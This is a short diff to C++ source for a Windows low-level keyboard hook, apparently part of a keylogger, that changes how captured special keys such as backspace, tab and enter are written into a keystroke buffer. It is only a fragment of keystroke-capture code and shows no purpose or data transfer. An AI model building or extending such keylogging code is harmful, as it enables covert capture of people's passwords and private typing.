@@ -17,17 +17,12 @@ LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
 		// Handle special keys with compact symbols
 		std::string specialKey = "";
 		switch (key->vkCode) {
-			case VK_BACK:
-				// Smart backspace - remove last char from buffer if exists
-				if (!keystrokeBuffer.empty()) {
-					keystrokeBuffer.pop_back();
-				}
-				break;
-			case VK_TAB:       specialKey = "[TAB]"; break;
-			case VK_RETURN:    specialKey = "[ENTER]"; break;
-			case VK_SPACE:     specialKey = " "; break;
-			case VK_ESCAPE:    specialKey = "[ESC]"; break;
-			case VK_DELETE:    specialKey = "[DEL]"; break;
+			case VK_BACK:		specialKey = "[BS]"; break;
+			case VK_TAB:       	specialKey = "[TAB]"; break;
+			case VK_RETURN:    	specialKey = "[ENTR]"; break;
+			case VK_SPACE:    	specialKey = " "; break;
+			case VK_ESCAPE:    	specialKey = "[ESC]"; break;
+			case VK_DELETE:    	specialKey = "[DEL]"; break;
 			// Skip modifier keys alone - they'll be caught with combinations
 			case VK_SHIFT:
 			case VK_CONTROL:
